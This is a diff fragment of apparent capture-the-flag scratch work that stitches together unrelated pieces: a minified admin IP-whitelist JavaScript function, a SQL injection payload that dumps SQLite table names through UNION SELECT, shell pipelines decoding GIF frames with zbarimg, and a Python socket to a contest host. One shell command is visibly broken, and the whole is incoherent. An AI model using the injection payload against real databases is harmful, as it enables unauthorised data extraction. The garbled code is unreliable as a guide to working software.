@@ -1,6 +1,9 @@
 function whitelist_ip(i,t){$.post("admin/actions/new_ip_whitelist",{action:"new",user_id:i,ip:t})}function prettyPrintTime(i){i=Math.floor(i);var t=Math.floor(i/60),n=Math.floor(t/60),o=Math.floor(n/24),e=pluralise(o,"day"),a=pluralise(n%24,"hour"),l=pluralise(t%60,"minute"),u=pluralise(i%60,"second"),s=[];return e&&s.push(e),a&&s.push(a),l&&s.push(l),u&&s.push(u),s.join(", ")+" remaining"} 
 'score=5&ineq=</**/UNION/**/SELECT/**/name,null,null,null/**/FROM/**/sqlite_master;--'
 
+for x in `seq 0 88`; do zbarimg gif_$(printf "%0one  | cut -d ':' -f 2-100 | uniq -c  | awk '{print $1}' | tr -d '\n' | perl -p -e 's/(..)/\1 /g' 
+and identify -format "%T\n" gife-f97a0c3eb838999e25dbda2d1f469674.gif | tr -d '\n' | tr -d '0' | tr '54' '-.' 
+
 import socket
  
 sc = socket.create_connection(("yws-fsiqc922.9447.plumbing", 80))
